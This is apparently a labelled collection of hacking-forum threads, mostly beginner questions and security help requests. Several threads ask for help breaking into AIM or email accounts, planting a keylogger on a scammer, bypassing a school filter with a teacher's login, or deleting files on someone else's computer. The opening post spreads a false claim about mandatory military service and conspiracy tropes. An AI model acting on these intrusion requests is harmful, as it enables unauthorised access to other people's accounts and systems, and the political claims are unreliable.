Please Read!	after reading the new bill that just past congress called hr. 1388. read here:  http://www.opencongress.org/bill/111-h1388/text , search for 1304 this is a list of what you cant do. if you dont want to read it heres the basics of it. the government is going to make it mandatory for everyone between the ages of 18-25 to serve at least 3-4 months in boot camp, along with this there are a few things under section 1304 that are extremely fucked up.  here is section 1304:   please read this part at least. ------------------------- ‘(a) prohibited activities- a participant in an approved national service position under this subtitle may not engage in the following activities:        ‘(1) attempting to influence legislation.        ‘(2) organizing or engaging in protests, petitions, boycotts, or strikes.        ‘(3) assisting, promoting, or deterring union organizing.        ‘(4) impairing existing contracts for services or collective bargaining agreements.        ‘(5) engaging in partisan political activities, or other activities designed to influence the outcome of an election to any public office.        ‘(6) participating in, or endorsing, events or activities that are likely to include advocacy for or against political parties, political platforms, political candidates, proposed legislation, or elected officials.        ‘(7) engaging in religious instruction, conducting worship services, providing instruction as part of a program that includes mandatory religious instruction or worship, constructing or operating facilities devoted to religious instruction or worship, maintaining facilities primarily or inherently devoted to religious instruction or worship, or engaging in any form of religious proselytization.        ‘(8) providing a direct benefit to--              ‘(a) a business organized for profit;              ‘(b) a labor organization;              ‘(c) a partisan political organization;              ‘(d) a nonprofit organization that fails to comply with the restrictions contained in section 501(c)(3) of the internal revenue code of 1986 except that nothing in this section shall be construed to prevent participants from engaging in advocacy activities undertaken at their own initiative; and              ‘(e) an organization engaged in the religious activities described in paragraph (7), unless corporation assistance is not used to support those religious activities.        ‘(9) conducting a voter registration drive or using corporation funds to conduct a voter registration drive.        ‘(10) such other activities as the corporation may prohibit.  ‘(b) ineligible organizations- no assistance provided under this subtitle may be provided to the following types of organizations (including the participation of a participant in an approved national service position under this subtitle in activities conducted by such organizations) or to organizations that are co-located on the same premises as the following organizations:        ‘(1) organizations that provide or promote abortion services, including referral for such services.        ‘(2) for-profit organizations, political parties, labor organizations, or organizations engaged in political or legislative advocacy.        ‘(3) organizations that have been indicted for voter fraud.  ‘(c) nondisplacement of employed workers or other volunteers- a participant in an approved national service position under this subtitle may not perform any services or duties or engage in activities which--        ‘(1) would otherwise be performed by an employed worker as part of his or her assigned duties as an employee or by another volunteer who is not a participant in an approved national service position;         ‘(2) will supplant the hiring of employed workers or work of such other volunteers.’. ---------------- see who voted for and against hr. 1388:   http://www.opencongress.org/roll_call/show/5358 hopefully everyone read that. its very important to know what kinda shit they are trying to take from us now. after reading this myself i decided that i needed to reach out to as many people as i can. even if that only means 1 person then i got somewhere. so here is a list of clips everyone should watch.. tell your friends/family/neighbours whoever you can.  obamas plan for the draft- mandatory service everyone 18-25: http://www.youtube.com/watch?v=htdswycpesq&feature=related obama deception: http://www.youtube.com/watch?v=eaaqnacwalw obama, which one did you vote for? http://www.youtube.com/watch?v=d_z5kz42gxw wake up call - new world order documentary: http://www.youtube.com/watch?v=qx_qoazmcfm&feature=playlist&p=f37889c74f02bf9a&index=0&playnext=1 i hope that i was able to reach out to at least 1 person. please reply your ideas and views on these topics here. and for the record.. the above reasons are why i despise obama , not because of the color of his skin.
2	I just hacked with SQL injection	hi, i just hacked a site with sql injection.  it was the admins login so i basically have control of the site now.  im not a black hat hacker at all.  do you think i should contact the site and tell them its vulnerable? or would that just get them pissed that i hacked it?  if so how should i tell them in terms they understand?
1	Set up a server that supports wireless	ok guys.. im looking for a few suggestions on this one.. im off to uni next week which means i have to use an etherne cable to connect to the network in my halls of residence. thing is.. i still want to be able to connect wirelessly which the uni does not allow.  the problem is that to connect to the network you need to be running the software which the uni distributes which checks your pc for antivirus software and that you os is up to date. so this rules out the possibility of just connecting a wireless router (correct me if im wrong cos that would be much easier).  the idea i had to solve this was to use a redundant shell as a server acting as an ap for the wireless. the problem is, it has to use either windows or osx so that it can run the software the uni uses. so linux is out of the window (which is what i was hoping to use). how can i configure this to act as a ap for my wireless yet still being semi useful as a server by caching and acting as a storage. the equipment i have is:  the shell:  something like a 2.4 ghz cpu about 512mb of ram one nic card a usb wireless adaptor which acording to the software can act as an ap my laptop running vista, dual core, 2gb ram. any idea how to do this? ive never attempted to set anyhting like this up and im looking for some advice on where to start before i go wasting time reading all the wrong stuff, or buying suff i dont need.
1	Hello All	"hello, i am not a newcomer to this site... i have been on and off it throughout the last few years but i am nowhere near an expert or even moderate. lol. i am very interested in learning this ""trade"" and i am very eager and committed to learn. if anyone would be kind enough to teach me a few things i would like to learn i will pay him/her a price we discuss.  1) i wanna learn how to hack email... (not for malicious intent but because my aol email was hacked by a trojan on my pc and i want to learn how to get it back.  2) i wanna learn what the most effective method of anonymity is and how to properly use it.  more may be added later but for now that is all i can think of."
0	HTS Guide For Beginners!	"introduction: hack this site is a free, safe and legal training ground for hackers to test and expand their hacking skills. more than just another hacker wargames site, we are a living, breathing community with many active projects in development, with a vast selection of hacking articles and a huge forum where users can discuss hacking, network security, and just about everything. tune in to the hacker underground and get involved with the project. because you are reading  this  post at the moment, it is most likely that you are new to hts (short for hackthissite) and are seeking help. id like to welcome you. many of you are here wanting to test your current knowledge of hacking/security or starting to learn to hack. learning to hack takes a lot of work, patience, and determination, as it will take many months or even years to be familiar with hacking. the challenges:   - basic:  there are 11 basic missions. most of the basic missions consist of password boxes and requires exploitation to find the correct password. the basic missions are very ""basic"", requiring html knowledge, logical thinking, and it introduces users to simple/common web errors and vulnerabilities. - realistic:  there are 16 realistic missions. the missions are self-explanatory. a user learns to exploit or attack pages in realistic situations by modifying the page or by gaining access. difficulty ranges from easy, to medium, to hard. - application:  there are 17 application missions. the goal is to ""crack"" the applications by gaining passwords using reverse engineering or data manipulation.  - programming:  there are 12 programming missions. the challenge requires a user to code in a programming language to perform necessary tasks. - extbasic:  there are 13 extbasic missions. the challenge consists of patching vulnerabilities/errors, or code review in the languages of php, perl, and batch. - javascript:  there are 7 javascript missions. same objective as basic missions. requires javascript knowledge.  - stego:  there are 17 stego missions. stego missions consist of digital objects using different methods to hide data, whether in images, a sound file, in a zip, and more.  starting out: for starters, id suggest that you try the  basic missions . the first few basic missions require logical thinking, but html is also  required  to complete the missions. html is a language used to create and display web pages with a web browser. to learn html, please read:  http://www.w3schools.com/html/ if you have not tried to learn html or dont understand html, i am assuming you are very, very inexperienced  with computers and need more guidance, which is understandable. you need to learn a bit about your web browser. if you do not know what it is, a web browser is a software/program that allows you to search or view information (such as websites) on the internet. a few popular browsers are internet explorer, firefox, opera, etc. http  knowledge in general would also help you accomplish the basic missions and will help you understand more about how things work in the long run. spoilers:   the reason why spoilers are discouraged is because the spoilers that are posted here are  too much  of a give-away and completely spoil the mission(s) for other users. posting spoilers will result in a warning. most of them contain mission links, mission file names/pages, mission scripts, etc. however, (minimal) spoilers are natural. i call these ""hints"". hints are just a push in the right direction by giving you the opportunity to actually learn. if you spot a spoiler, please report the post(s) and/or contact the moderators! more help:   there are plenty of help right here on the forum! so, please take the time to read the topic(s) suitable for your interest! for more help, please browse through articles on the main site (which is under ""get informed"".) you may also join our irc and use our bot moo for hints.  irc:   server:  irc.hackthissite.org ssl:  6697 or 7000 reference:   http://www.hackthissite.org/pages/irc/reference.php connect now! -  http://www.hackthissite.org/pages/irc/irc.php -----or----- - download an irc client such as x-chat or mirc. signed, monica [hts lead moderator]"
3	Rick Roll The Vote	hypothetically, do you think that the electronic voting stations are penetrable? i am just curious about how the polling stations are set up. in canada we do things the old fashioned way with pen and paper, but downstairs i know you guys are using electronic stations. how are these populated? is someone in charge manually configuring the ballot at each station (this i somehow doubt)? if not are the ballots configured at a head-end in each state, or even federally and then populated over a public network? if this is the case... hypothetically, would one be able to get in somehow and change the ballot? im not talking about anything malicious like fucking with the tally or anything like that. just expose the security flaw by adding mr. rick astley to the presidential ballot, and letting democracy run its course. this way people can save the time of writing his name in.
1	Website issues...	say there was a site that was pretty much exactly the same as  http://www.imobcodes.com .  what are some security loopholes that can be used to exploit the site and add postings to the top of the list on the site...  i am trying to keep from making any of the same mistakes with my up and coming website that is similar.
3	Net Neutrality?	yea so a buddy sent me this, basically the other night he and i were discussing how the rothchilds are trying to push the cyber security act of 2009. for all those that dont know what that is, it pretty much gives the president full power over the entire internet in the u.s during times of war. but we all know they will use it even if we are not in war..and heres another excerpt of what they want to surpass onto us. http://arstechnica.com/tech-policy/news ... isions.ars
1	PHP Brute Force Code	im attempting to write code to do a php brute force crack on a page that has two form fields name and number. i have the name that i want to enter but the number has to be six(6) digits from 000000-999999. i want to use php and curl to do it, but im having a bit of a problem having curl return the results page after submitting the form. in php im having a problem getting my character length to six, when i try to have it process an int starting at 000000, it actually looks at it as 0. can anyone give me some sound pointers as to how to go about this or even have sample code??? also the page has is login.do is a .do extension a problem when it comes to forms???
1	assymetric/symetric encryption on s60 phones	not sure if this is the right forum to post in, maybe this goes into crypto??? its about phones though... im trying to create a symbian s60 implementation of encryption over the public telephone net, voice only. if anyone knows of a free (open source) program that does this, tell me so i wont have to go through the trouble coding my own :s. s60 + signature scheme is a real pain in the butt. so ive been thinking of the following setup/implementation: public key exchange -> streamcypher initial state is agreed on via challenge/response using public key encryption by both parties -> symmetric key using agreed streamcypher is used, connection established -> data sent, streamcypher seed occassionally changes (irregular timeperiods, up to 300 seconds of same key, after that mandatory switch). im not sure which cypers to use though. something similar to what ssh2 uses perhaps. i definetly want to avoid rsa, its not really that secure. as for the stream cypher im thinking of rabbit, rc4, or pike (xored combination preferred). probably rc4 though, it has a good reputation and is quite fast.  the issue here is latency though. if i want to change keys every now and then and run the thing on an arm processor with s60, rabbit might be difficult to implement. ill try sending the voice data in compressed form, e.g. as flac. also, what are your thoughts on the initial challenge/response implementation? should i use elgamal? elgamal seems inefficient though, especially considering its expansion ratio of double plaintext.  hmm... in the days of imsi catchers and broken a5/1, this could really be quite useful. annoyingly, mim attacks could become really common in the underworld if this is used too often :s. so what are your suggestions? is my scheme viable? even remotely possible without severe lag? im not using 3g. im talking about the standard telephone network, i.e. voice. ideally, someone whos trying to listen in will hear only what seems like white noise.
1	Windows Update	one of my first problems about my computer is the windows update function. it hasnt detected any updates for my computer in the past year, i dont know why this is the case, i have tried reformatting the computer and all sorts, nothing works so far     the computer could detect updates when i first got it, and then, it all died away all of a sudden. some things you might need to know: i dont download malicious programs or any suspicious programs. i have windows vista home premium 32 bit operating system dual core - 1.80ghz processor if any of this helps.  can someone please explain to me why this happens?  because i fear that it could slow my computer down because its not up to date and such. thank you in advance, aaron. edit: this might even help more: i get this error code: 8024402c.
1	Id like to have a tad bit of guidance	ok, my girlfriend just came to me today saying that shes forgetten teh password to a .docx file where she wrote her poem in. apparently theyre using aes128 to encrypt it. the guidance im wondering is where should i start to help her recover said password/document. should i attempt to decrypt the entire document? or would it be better to just brute force till the morning light. the second thing is, how safe is safe enough with the use of passwords for an average user. i am currently going to be using bcrypt with a salted value which is a random string of text, then i was going to add in ~20-30 characters of text to both sides of said password then its encrypted. therell be 1 nonce which is set in stone for everyone, and teh second one will be chosen pseduo randomly and the value  for which one it is in the list will be stored in the database. now then besides that how many attempts at logging in should i allow someone to do? i know this last bit isnt too much as far as cryptographys concerned but the first part is and i didnt wnat to make three threads for a similar post. the third thign would have to be two crypt is the best way to encrypt the users email addresses correct? if anything in this thread doesnt belong in the cryptography section then feel free to move it, i just thought that it was fitting to be here since a majority of it deals with cryptography.(which ive found a new interest in as of late)
1	Hey.	"my name is justin, i was a member on here before, but i cant seem to get my password sent in the email. no one would have known me anyways. ;o but, i always loved this site, and im looking forward to coming back! would there be any way a moderator or admin could reset my old account for me? im pretty sure my old account would be under the email i signed up on with this one, but i dont see how its possible. my old username was:  rhytox edit: by the way, i need help with basic 5 and its not letting me make posts or reply in the basic forum. theres no ""new topic,"" or ""reply"" buttons to click. do i have to reach a certain post count to do so? my problem with basic 5 is that im entering the injection and nothing happens when i get done. it just sits there."

1	Exploiting my own system	i had an idea recently to set up a server on my home network just for me and my friends to hack. i want to set up a crappy server with little security and then try to exploit it. then as i learn more up the security to make it harder. what i was wondering is if my isp would get upset about something like this? i know they cant do anything about me messing with my own stuff but what about my friends? i want to make a little game out of it. has anyone else ever done anything like this?
3	The difference between being a skiddie and a professional	"this is really interesting and warrants a read to those looking to get into the field professionally. http://blog.silentsignal.eu/2015/04/03/ ... cruitment/ tl;dr:  ""sadly, most of them only used fully automated tools, which couldn’t even recognize the most basic xss (or even find the app)... the challenges were simple and common pentesting tasks. most contestants couldn’t think like a professional hacker, but the bigger problem was that they couldn’t seem to use google either."""
1	Help me seek revenge.	summary: i am currently looking for a house to rent for the winter season in whistler, canada. one of the landlords i contacted emailed me back with detail on his apartment and what sounded to be a pretty good deal. anyway after having completed an application form and being approved for tenancy, i found out that he was really based some where in africa, most likely nigeria and that he was infact trying to scam me out of several thousand dollars. so obviously im pissed he tried to scam me but what really pisses me off is the time i wasted corresponding with him. which lead to me losing the opportunity to rent several other properties. (which in whistler is a big deal, because as many as a 100 people will show up in an hour to view a property). so i want to seek revenge on this guy and get back at him for trying to rip me and other people off. all i have is his email address and telephone number. i was hoping to maybe trace it back to him ? and inform the police (although nothing much would happen from this). or try and beat him at his own game and send him a keylogger or trojan and atleast fuck his computer up. or find out some interesting details about him. he went by the name of reverend borris gapanovitch. i had to submit an application to him (word or text document.) and i was thinking maybe i can hide or attach a keylogger or trojan in this. if i submit it as an updated version or as another person. also he doesnt know i know he is a scammer, so that may be usefull aswell. let me know if you can help!

1	Need some help.	ok, so im not sure if this would be the right place to post this, but i wasnt able to find some place i thought would be better. here is the situation. computer a is part of a network, is xp based, and is running current commercial anti-virus software.  computer a has pictures on it that are of a sensitive nature and need deleted. they are not in a shared folder. computer b is also part of a network, xp based, and running commercial anti-virus software.  computer b is not part of the same network. from computer b, is there a way to delete these pictures if you know computer as ip address, without needing to know passwords, or having a user on computer a give direct access? if this post is too vague to answer, but you feel you might be able to help me, pm me and we can either chat in pm, or via email/messenger.
1	View website directories and etc...	"hey everyone,  im still a complete newbie. and im still learning all the terms and such, and what they mean. i have the idea that my question is something that a scriptkiddie would ask, but i have no shame in this. i just want to learn! my question is: is it possible to view a websites directories? where it shows you all the folders and files. or does the server its running off of have to be set to let you view them like that. i guess i might as well state what im trying to do here too. there is a site that i visit and they use this like point system to give you access to more and better things. what i would like to try to do is use something like maybe... javascript injection? to change those point values (even if its just temporary) to get to the next page. if my idea is wrong, could someone lead me in the direction that could help me? im the sort of person who just cant motivate themselves and say ""oh, hey im going to learn such and such for the heck of it."" ive noticed that i need a project to work on and then i will find the information i need to know. also, guess this might be as well a place as any to ask this. could someone recommend to me a course of study? like, which topics to cover first so that i could hopefully do these sorts of things on my own. like... start with javascript and then go into php and then into c++ and then etc...? i also want to make real and legit things too, but you gotta know both sides to really understand it.  thanks... sorry if this is too wordy or confusing... im working on that part"
1	Hacking 101... am i right?	"okays... so i am a newbie, ill shamelessly admit. ive done the basics and the javas but not anything else just yet. what i want to do is complile a thread, and maybe even sticky the completed thread if admin see as appropriate, of basic hacking. not how to hack so much as the ideas behind it. i can hack a basic challenge, but what does that mean? i read about a guy who hacked hotmail to get account details, but what does that mean. if we can answer these questions, it may reduce painful ""i dont know how to hack teach me to hack i want to hack so-and-so type"" topics as well. seem unclear as to exactly what i mean? ill explain. an example mite be useful (however this info could be wrong - this is a compilation of estimates and flat out guesses) when ""hacking"", a person is trying to create them selves an unrestricted accsess to files on a system, be it for a website or a computer. to hack a website, you might find a way to trick it into believing you to be admin (eg bypassing password input) and as such recieve this accsess. or, you might even hack intoi a server on which each html page and database is stored for a website, and from there read/modify/remove files, eg a database or users and login ins. **here insert a section similar on pc hacking (i havent a clue. remote accsess?) to begin learning a process of hacking, you must become a programmer, the two arts are closely wound. w3 schools is a useful site, and google is even more useful - use it to answer the unknown. ** note this is as more for my benifit than anyone elses, as this info is my guessing and if modified could provide valuable information even to myself. i have posted this idea simply because as a noob i can see the need. many noobs would hack basic challenges but not understand how to apply these outside of such a controlled environment if required. any thoughts? nick"
1	AntiVirusPro2009	so this is almost like the one several posts down but worser: ive been on a lot of forums looking for help, i heop this is the one that will help me. alright so recently i got a anitviruspro2008 on my computer and i fought it off. but this time its a pro2009 one, and it seems different than the other.  i got rid of pro2009 fine but it changed my wallpaper/background to a blue one, almost lookin like the blue screen of death w/o the words.  so i change it. everytime i shut my computer down, the wallpaper goes back blue. is there some remainin virus in my computer ?  another problem, when i got the virus a delself.bat(i think it was bat) appeared on my desktop. i threw it into the recycle bin, was that a good thing ? i am using a windows xp, firefox, and have avg virus thingy. thanks and,,,, i got rid of theanitviruspro2009 by using combofix also my computer is freezing frequently. i cant do anything, so i just keep pushing the power button then restarting it. please help me now. please !!1 i cant get a hijackthis because of the freezes.

1	novell internet restricion bypass help	hello my schools network is novell im not sure what version but i think its the newest one but they blocked basically every website, i saw one of my teachers bypass it but was unable to get the pass the user name was mastract2005 he logged on to bascom. if any one could help me bypass that it would help alot and the bascom login is in javascript i will post back with a copy of the source code after the break on monday but i really need help bypassing it, the network is pretty open i found the messaging system, sort of the root directory hs4 but its only mine or something because when i use cmd and change the dir back i can only see my files in \\hs4\vol1\student\s(my user name witch is also my student id)hen my documents are listed here. i can see my start menu but only an empty all programs file and log off. the operating system is xp pro can see my c:/ through dos but other than that i cant, open or see the drive in my computer. there is a public drive with gives me a good amount of files which include a win32 with has an admin tool with allows me to see every student and teachers full name by login name s***** for students and (1st letter of 1st name)then last name for teachers.if you guys need more info ask me. i will show off a little (not show people   ) then tell the admin of the exploit or bypass of the internet and please no proxys they arent that great. but any other novell exploits that work could be useful im not trying to shutdown the network or anything i could get in a lot of trouble for that but i would like to find a way to bypass the bascom login to think im the user mastract2005 and give me free run of this site in school but its in javascript and i dont know how to bypass that yet but i will like to learn. like every other beginner i do want to learn to *hack* but im not a beggar. im learning c++ so that might help but please if anyone knows any way to bypass the internet block or any other exploit please help. the admin in my school isnt too bright i dont know him yet but i need a good reason to be introduced so please give me a hand thanks in advance tvs1230

1	PLEASE HELP ME ASAP	so today i launched my website and told my friends. one of my friends said he can hack it, i being stupid said okay go ahead. i have a points based system where you can get points if you answer the capital of a country correct, he went to the video page where if you watch the video, you get 200 points and went to inspect elements/console and typed in something like profile:blah.blah. at first i doubted it would work, but he did it and hacked it and got 1 000 000 points. no more to be said. i contacted my domain and they said they need the exact sql or something code for it. can someone please help me by telling me how he hacked it like the steps. (i used java too) i am actually begging because my year of work is nothing since my website doesnt work, i need the command to block it from being used on my site. i know what i am doing so please dont deny it since it wont help at all. all i need is the method of how my friend hacked it through the console menu. thanks!   edit: he hacked me, not just inspect elements, he even refreshed the page and re-opened it and he had 1 000 000 points. like wtf? this is what he did: he typed something like console.profile(his.profile) and he changed the video so you can get a crap ton of times every click, click! after the profile thing he did like .setinterval something. he didnt even let me see, i got lucky i saw. so if you were him, what would you do to hack me? what commands?
3	Newbie challenge	"it appears that a large number of people want a newbie challenge from the hts wish list post. i am starting this poll just about this one issue. even if this poll is 10000-0 yes it doesnt mean we will implement it. there are a lot more annoying emails and bug reports this way ""i couldnt find the password to register - what is it..."". on the other hand the forums stay clean from ""i used my password for basic 1 but it didnt work....."" type posts. this poll is to see your opinion.   please try to follow up with a reply explaining your reasoning.   reasoning matters more than votes here. update: actually create the poll :\"
1	How bad is this?	"ok so im at college, and i have a wireless router although after being frustrated that none of my sweetmates could remember the password (they didnt want to save it for some stupid reason, i cant remember why) i tried to limit it to all our mac addresses but unsecured, that seemed to work for a while, till i had friends come over that werent normally over and be like ""why cant i connect to the wireless"" or worse my sweet mates would try and connect with another device and be like ""why cant i get on?!"" so then i just made it completely unsecure because everyone around here has free internet access, and no one i really think is any threat however the login to the router has been changed, and i make sure me and my sweet mates are running pretty good security now i know there are vulnerabilities with leaving your router unsecured even by people not in your area (people trying to connect to it through the net) by my router goes through a switch that connects to the server at my school, so the ip the router recieves is an internal one, not an external, and has all the protection of the schools system so what im asking (besides the obvious risks of having an unsecured router, that im ok with cause i know pretty much everyone around here, and doubt they could get in anyway) am i setting myself up for a problem from people outside my college?"
1	AIM Hacking? please help	i dont really think it is appropriate for me to post a question like this without looking like a noob as my first post but i kind of need an answer     so here is the back-story: so my friend thinks his girlfriend is cheating on him and he is to much of a loser to ask her/figure out if she really is. they both also happen to be heavy im users. so naturally he asks the computer kid (me) if i know how to hack into peoples aim conversations. so me being a stupid idiot am like ya ok ill do that for you. problem is is that i dont know how to hack aim... yay... so question is, is there an easy way to hack aim for free? i already know a ton of pay for programs but i really dont want to spend money on a hobby that should be near-free... plus im broke  any help would be appreciated... oh also, program needs to be mac/unix/linux compatible cause that is all i have
1	How to catch a hacker	if there is a hacker trying hack your website (ie industrial espionage nothing malicious ) a how do you know someone is hacking your website ( the hacker is stealthy goes it copies a few files nothing obvious) b if you know your website is being hacked what can you do to find this hacker and bring him to justice, what techniques could you do to get their ip adress. note they could be using a proxy or hacking through an internet cafe what are common noob mistakes hackers make that you can exploit to catch hackers? -- sat dec 12, 2009 6:54 pm -- just to note when i mean catching an hacker i mean finding their ip adress so you can sue them or report them to the authorities
1	ADVANCE MALWARE PROBLEM HELP	"i typed all this one - mozilla closed     so anyways, none of my anti-virus programs will work, they all get errored out. i got this program from a friend, he recommended it to me its called superantispyware. but before i talk about that, my computer has that annoying ""your computer is infected"" background, and my computer is very slow and i get a bunch of annoying anti-adware pop ups, which i know if i click them itll just mess my computer up more., and the tasmanager has been disabled by the admin which is me so i dont know how that happened. also - system restore does not work, i dont get an error or anything, when i choose the date click, next, then click next again nothing at all happens. anyways - the superantispyware that i installed does work good. except i had over 400 viruses or whatever spyware/trojans, and i deleted all of them, then bang my internet stops working, i think something in my registry that has to do with my internet is infected, whats your opinion/what do you think? so then i put all the viruses from the quarntine back on my computer, and then my internet worked again.. any ideas?? - thanks in advance!"
3	Have proof of internet fraud, what now?	"a few days ago i sold my world of warcraft account. the person i sold to later recalled the money. turns out the person i sold to didnt recall the money, the person whos paypal got hacked a few days before by this person did. the person was an idiot and also gave me his personal e-mail. i spoke to the person who the paypal account actually belonged to and he gave me a list of all the transactions the person did on his account. i then had a talk with the person who stole my account. he said if i sell him a higher level character hell give me back my character for free plus the money for the new one. my response was obviously hell no. he thought he was all tough and said well then bye and i said wait. kept him talking for a while and began giving me the advantage by asking him who the people he was trading money with were. he said his partners. i said in scamming? he said no im not telling you what we do. that means to me that its illegal. i continued by noting that i had all his partners e-mails, addresses and phone numbers (assuming their real info on their paypal. this doesnt seem like their to bright so it probably is). during this time i had been getting his ip address and just finished getting where he lived from it assuming he wasnt using a proxy or anything. then i told him i knew that information, a yellow books search gave me his phone number as well. then i could tell he was starting to get worried. he kept telling me to shut up and give him the information for the account he wanted me to sell him. i said no thats not how this is going to work your going to give me my account back or ill report you and your partners for internet fraud (which he also admitted to in the convo. i kept a log btw) and when that happens your ""partners"" wont be partners with you in prison. no one likes the guy that f**ks everything up. then he said fine ill just keep your account and i said no actually ill just have to contact blizzard entertainment and get the paperwork to get the account back in my name. itll take a bit longer but ill still get it. and then ill report you guys. after that he said fine come to los angeles and do something about it. that was completely stupid since that verified that what i traced from his ip is true. after that he logged off. now im stuck because i dont know what to do. i was thinking i should notify his partners of what i know. i already told the paypal owner and hes happy im getting a rise out of this guy. but should i go ahead and report him? im 13 so i dont think i could get in any serious trouble for any of the stuff i did especially since i have proof of what they did but i dont know much about laws just doing this stuff hehe also, did i already break the laws from what ive done so far? maybe like harassment or something. still all i want is my account back. also, i was thinking of a more but definitely illegal plan. my only idea was use a fake mailer to send him an e-mail from his ""partners"" with a keylogger then get him to just log on to the account to show me he didnt change anything and tell him afterwards ill sell him the one he wants. then change my info and done. of course using proper protection and everything to cover my tracks. change the e-mail with the account a few times so he cant figure out what the current e-mail is. but i want to avoid breaking too many laws if possible. what would you guys recommend doing? also, i know hts doesnt condone illegal activities which is why i posted here because you guys can give me the safest option."

3	Why do you program?	"lets not even step into hacking but a simple (seemingly) question ""why do you program?"" ~        were a community some background story would be nice (dont be a lurker?). my whole goal of learning programming was at first to of course to hack runescape (be easy on me i was 11 when i first decided on that) when i got a little older (13) i resolved it was because one day i would be a technology businessman type. this also got me into learning japanese since it is certainly the epicenter of hi-tech stuff, learning japanese also got me into anime which now i may be going to far off topic.... when i was 14  i resolved it was practically something i was born to do all of it seemed so natural my cousin a professional it worker even commended me on my knowledge of computer architecture. of course at the point of 14 i knew little about programming even with advanced knowledge of the ins and outs of the different programming languages themselves (id complain to my friends why program in a language abstracted from the environment by a vm...).       14 i resolved i program because i want to know what makes computers work so that when i make a whole knew kind of computer i know how to make it even better than its predecessors. 15 i still have that same resolve and c/c++ were boring me because  i felt i wasnt learning anything important. even with c/c++ i was being far to abstracted from the nitty gritty that i needed to learn about, so i went straight to simple asm.c/c++ header files really made me feel worthless like i had to use something someone else already ""pre-programmed"" for me and im the lazy dude who doesnt even inquire how it really works, and doesnt even have the skill to. ""how do i learn more about computer architecture when i cant even grasp concepts that arent even machine related?"" but i learned that computers dont really know much algebra its all 1s and 0s when it gets to them, thats whats important besides... i past algebra fine even while day dreaming nearly all the time. steps:      11 i went into scripting flash games (that got me giddy enough), i also started private servers (runescape of course, from this point on i was always doing some type of ps) doing ps taught me alot (emphasis) alot about advanced tech savvy, i had to do things like set enviromental variables, port forward, and light sql database management to run my first ps.  getting involved with ""illegal"" stuff like ps lead me to the underground of warez some months after my computer caught a virus with me trying to get a nice registry cleaner (yes im still 11). so i looked up operating system and saw something called linux i soon downloaded unetbootin and supposedly installed this really koohl os with an awesome gui feature called ""beryl.""       some how i ended up downloading and installing a kernel version of ubuntu (sad days =l) nothing but a dull old full screen terminal it always spat out these immense lines of information on start (very intimidating i was really missing my old virused computer windows) but i met many adversities with ps also ( i always goolged like hell to find solutions on things) so i trudge through with the help command and the most useful command ive learned for any terminal yet was learned at this moment ""sudo apt-get install.""         12 this was the dark ages of mindless habbo playing i met really good friends their that ive lost (this was the dark age for habbo also, hackers reigned and stole furni and account info frequently). i roamed habbo ps now (being scared to death of rumored moparscape viruses refer back to living in ubuntu kernel mode viruses are scary business indeed almost as scary as *nix terminals) this taught me alot about basic code stealing since alot of the times you had to leech html from a site that had a working client. and basic web design came along with habbo ps. at some point i also go into using the wpe packet editor (i forget why i started).        13 trrra tra tra trollin on em. this was the age of me making fun of people faking to be programmers, at this point i had no actual coding experience but read enough articles and theory to convince anyone i did know how to. i did so much debugging with ps at this point any problem you had with any kind of server that required some tech savvy and basic html & sql database knowledge i could solve. so i roamed ps forums helping people and etc. this was when i read my first programming guide it was a pdf i got (my first small with programming encounter was actually some python video tutorials at 12) c++ programming for dummies, i could never read it through it was a bit confusing so nothing much happened (the way they worded things i think was it ""huh what a variable is a container wha?"" "" (14) huh what a variable is a container? oh wait he means like a variable like in algebra..."" (it might have been a waste considering i already had passed algebra when i was 12 i was enrolled early on into school).       14 the age of boredom giving up ps i was on the search for the perfect game. nothing but pure gaming call of duty runes of magic (no rs its a custom among gamers to give up point and click crappy graphics things at the age of 12) s4 league. but there was then a sudden rebirth in learning and i acquired access to the masm forums (being horribly immature an annoying) i harassed the community for guides and such. i read some crappy half assed (now that i think about it i could swear those guys in masm pulled one over on me) few chapter in size stuff on asm that pretty much told you instructions and described their size then had a graphic of basic architecture of a computer (thus pretty much i learned nothing about actual asm coding). this was the age of my mom dragging me to shop with her, i sat miserably most of the time but when i finally got up to look at the book section i found a gold mine of ancient books. they were old but they were still about programming at the least, i had gathered to much and the java and asp (still to this day dont know what an asp is other than it being some web design language implemented by ms?) books had to be put aside.       knowing maybe to much for my own good i resented vb for it being so ridiculously gui (and windows) based (from what little ive learned, vb is like first having to learn what all the little mundane buttons on photoshop do (in the form of mundane click and drop boxes) and then having limited control over the gui, and some weird pseudo code is the result) it simply confused me for one secondly it used vlc (i knew this about the language beforehand) which having this kind of abstraction i saw it as useless but i was giving up on myself and i figured i was to dumb to understand anything else. but along with a vb book i picked up my real inspiration ""learning to program in c ~ thomas plum"" (infront of me right now). and i also picked up some random ""introduction to data processing"" book it told a little about real computing history but the author was obviously one of those old timey vb buffs trying to convert you around every corner (constant showing vb examples of useless ""business applications"")  i wasnt buying it, i was curious why he didnt think he should know how these things work in order to be qualified to explain  any type of programming at all.  this caused a rebirth in asm learning i picked up randel hydes book and tried my best (the most ive learned from it is how to accurately evaluate any base number system by its radix).        15 i picked up  assembly language step-by-step: programming with linux  i realized i knew a  hell alot  about asm from all the masm forum lurking end even those half assed books on asm and even randel helped. i could have skipped 4 chapters basically but i am a cautious one so i started reading at chapter 2. as far as i can tell ive been moving at a horribly lethargic pace, my thing isnt i  want to learn programming as fast as possible its just horrible when i put so much in and get back so little. the reason why i venture into hacking at this point is still to learn in depth about how computers handle information.      so far i can say i know enough about c/c++ that i could program any general purpose type application. asm not so much but i understand alot of concept (much of which ive already known since i was 13-14). back and forth movement of information through addressing a particular memory. the stack is where new info is pushed into flow, 32bit registers can only address some 4billion memory spaces (3 gigabytes). stuff ive known for a while... nothing new yet just learning alot more about architecture from this book so far but its good for the ""absolute beginner"" architecture is important (something ive been studying strong for 2 years now). ~ sorry if this was boring but i figured my story might give others some more confidence, tell yours if its better."
1	Urgent Help Please	dear all i have problem with my website i build website using php script after few months the website get hack more than one from the same hacker. ever time the hacker replaces the index.php file with his hacked file after that i renamed the index.php to other name like mypage.php, and i added some scripts on .htaccess file to make url mapping from index.php to mypage.php because if any user type index.php automatically it mapped to mypage.php after some times the hacker get way to delete the .htaccess file from the server and upload his hacked index file again. can any one help me how the hacker can access the website and change the index file? is there gaps from script for example that let the hacker can access the server or theres a gap on the server that let the hacker access it and how defend my script to get it not possible to hack again if the gaps form the script? regards,

